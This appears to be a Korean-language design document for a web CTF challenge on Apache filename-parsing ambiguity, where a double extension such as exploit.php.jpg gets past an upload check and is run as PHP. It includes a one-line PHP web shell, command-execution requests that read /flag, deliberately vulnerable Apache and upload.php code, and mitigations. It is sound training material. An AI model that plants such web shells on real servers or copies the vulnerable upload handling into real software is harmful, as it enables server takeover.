---
title: Apache Filename Parsing Ambiguity RCE — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, apache, file-upload, double-extension, addhandler, misconfiguration, rce]
confidence: high
---

# Apache Filename Parsing Ambiguity RCE — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Secure Media uploader (보안 미디어 업로더)
- **난이도**: Medium
- **핵심 컨셉**: Apache HTTP Server의 파일 확장자 매핑 처리 명세와 PHP 등 스크립트 실행 모듈 간의 연동 오설정을 파고드는 **아파치 파일명 파싱 모호성(Apache Filename Parsing Ambiguity)** 취약점 문제입니다. 대상 애플리케이션은 사용자가 프로필 배경 이미지나 문서를 자유롭게 업로드할 수 있도록 지원하며, 보안을 위해 업로드된 파일의 맨 마지막 확장자가 이미지 규격(`.jpg`, `.png`, `.gif` 등)인지 검증하는 블랙리스트/화이트리스트 필터를 갖추고 있습니다. 그러나 웹 서버 설정 파일 내에 특정 파일 핸들러(`AddHandler` 혹은 `AddType`)가 안전하지 않게 활성화되어 있어, 공격자가 파일명 중간에 `.php`를 삽입한 이중 확장자 파일(예: `shell.php.jpg`)을 업로드하면 시스템이 이를 이미지 파일로 간주해 보관하지만, 브라우저가 해당 파일에 접근할 때 아파치는 중간의 `.php` 지시어에 반응해 PHP 스크립트로 파싱 실행시킴으로써 RCE를 획득합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Image Upload Service (`/upload.php`)**:
  - 사용자가 업로드한 파일명의 끝이 `.jpg` 혹은 `.png`로 끝나는지 검사하고 `/uploads/` 폴더에 그대로 저장하는 API.
- **Apache Web Server**:
  - `/uploads/` 폴더 내에 배치된 파일을 서빙함.
  - 아파치 설정 내에 `AddHandler application/x-httpd-php .php` 지시어가 잘못 포함되어 있어 다중 확장자 분석이 비정상 가동됩니다.
- **Flag 위치**:
  - 서버 파일 시스템 루트 경로 `/flag`에 파일 형태로 저장되어 있어 RCE를 통해 획득해야 합니다.

### 2.2 취약점 지점
1. **Multi-Extension Parsing in Apache (다중 확장자 해석 구조)**:
   - Apache는 기본적으로 오른쪽에서 왼쪽으로 확장자를 하나씩 검사하며 MIME 타입을 결정하려 시도합니다.
   - `AddHandler application/x-httpd-php .php` 설정이 적용되어 있으면, 아파치는 파일명 내부 어딘가에 `.php`라는 문자열이 마침표로 구분되어 존재하면 해당 파일 전체를 PHP 핸들러(`application/x-httpd-php`)로 처리합니다.
   - 예: `shell.php.jpg` 파일은 맨 마지막 확장자가 `.jpg` 이므로 MIME 타입 자체는 이미지일 수 있으나, 파일명 내에 `.php`가 내포되어 있으므로 아파치는 해당 파일을 PHP 스크립트 연동 대상 파일로 판정하여 PHP 번역기로 인계합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | 파일 검증 정책 | 취약 웹 서버 모듈 |
|------------|--------|------|----------|----------------|-------------------|
| `/upload.php` | POST | 불필요 | `file` | 파일명의 마지막 마디가 `.jpg`/`.png` 인가 확인 | Apache `AddHandler` 다중 확장자 바인딩 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 파일 업로드 규칙 진단
1. 사용자는 일반 이미지 `test.jpg`를 업로드하여 정상 수락됨을 확인합니다.
2. 실행 스크립트 `shell.php` 직접 업로드 시 서버 단에서 "허용되지 않는 파일 확장자입니다" 라는 사유로 반려됨을 관찰합니다.

### Step 2. 이중 확장자 (Double Extension) 페이로드 합성
1. 공격자는 끝자리 확장자는 `.jpg`를 유지하면서 중간에 `.php`를 결합한 악성 웹쉘 명칭을 설계합니다.
   - **파일명**: `exploit.php.jpg`
   - **본문 내용 (웹쉘)**:
     ```php
     <?php echo system($_GET['cmd']); ?>
     ```
2. 이 파일을 `/upload.php` API로 업로드 요청합니다.
3. 백엔드 PHP 코드는 `exploit.php.jpg`를 분석 시 맨 마지막 마디(`.jpg`)를 읽어 이미지 화이트리스트 필터를 안전하게 통과시키고 `/uploads/exploit.php.jpg` 경로로 저장합니다.

### Step 3. 업로드된 파일 직접 호출 및 RCE 유발
1. 웹 브라우저를 열어 업로드 완료된 가짜 이미지 주소로 다이렉트 접근을 시도합니다.
   `GET /uploads/exploit.php.jpg?cmd=id`
2. 아파치 웹 서버는 해당 파일을 불러오는 요청을 처리하면서 파일명을 파싱합니다.
3. 아파치는 맨 우측의 `.jpg`를 보지만, 설정된 `AddHandler` 지침에 따라 중간의 `.php` 지시어 또한 맵핑 가동 대상으로 판정합니다.
4. 결국 아파치는 해당 파일 스트림 전체를 PHP 런타임 인터프리터로 로드 및 실행하며, `system('id')` 구문이 동작합니다.

### Step 4. flag 획득
1. 쉘 명령어로 루트 경로의 플래그 조회를 수행합니다:
   `GET /uploads/exploit.php.jpg?cmd=cat%20/flag`
2. 응답으로 노출된 명령 출력 텍스트에서 플래그(`FLAG{apache_addhandler_filename_parsing_ambiguity_rce}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 및 웹 서버 설정 스니펫

### Apache 설정 (`httpd.conf`)
```apache
# httpd.conf (취약한 Apache + PHP 연동 설정 예시)
<Directory "/var/www/html/uploads">
    # 취약점 지점 1: AddHandler는 파일명 내에 .php가 포함되어 있기만 해도 
    # PHP 스크립트 실행 대상으로 처리하는 위험한 파싱 모델을 차용합니다.
    AddHandler application/x-httpd-php .php
    
    # 또는 아래와 같은 오설정이 있어도 동일하게 취약함
    # AddType application/x-httpd-php .php
</Directory>
```

### 업로드 핸들러 (`upload.php`)
```php
<?php
// upload.php (단순 끝부분 확장자만 검증하는 취약 코드 예시)
if (isset($_FILES['file'])) {
    $filename = $_FILES['file']['name'];
    $temp_path = $_FILES['file']['tmp_name'];
    
    // 취약점 지점 2: 파일명의 맨 마지막 온점(.) 기호 이후의 문자열만 화이트리스트 체크
    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    $allowed = array("jpg", "jpeg", "png", "gif");

    if (in_array(strtolower($ext), $allowed)) {
        $target_path = "uploads/" . $filename;
        move_uploaded_file($temp_path, $target_path);
        echo "파일 업로드 완료: " . $target_path;
    } else {
        echo "허용되지 않는 파일 확장자입니다.";
    }
}
?>
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **안전한 PHP 실행 지시어 전환 (Use FilesMatch instead of AddHandler)**:
   - 파일명 내부에 `.php`가 임의 내포된 경우까지 실행하는 `AddHandler` 대신, 오직 파일명의 맨 마지막 확장자가 `.php`로 완전히 종결될 때에만 PHP 런타임을 매핑하도록 `<FilesMatch>` 지시어 블록 설정을 강제 적용합니다.
     ```apache
     # 안전한 Apache PHP 연동 설정
     <FilesMatch "\.php$">
         SetHandler application/x-httpd-php
     </FilesMatch>
     ```
2. **업로드 파일명 무작위 난수 갱신 (Rename Uploaded Files)**:
   - 사용자가 전송한 파일 이름을 그대로 보관 디렉터리에 쓰지 말고, 서버 단에서 임의의 안전한 해시나 UUID 난수 문자열로 완전히 개칭하고 뒤에 단일 정적 확장자만 부착하여 저장합니다. (예: `exploit.php.jpg` -> `random_uuid123.jpg`)
3. **업로드 폴더 내 PHP 엔진 오프 (Disable PHP Engine in Uploads)**:
   - 파일이 업로드되는 폴더 내에 `.htaccess` 설정을 두거나 Apache 주 파일에 `php_flag engine off` 속성을 선언하여, 파일 확장자 파싱이 어떻게 우회되든 해당 폴더 내의 스크립트 코드가 브라우저 요청 시 해석 구동되는 현상을 기술적으로 불가능하게 차단합니다.
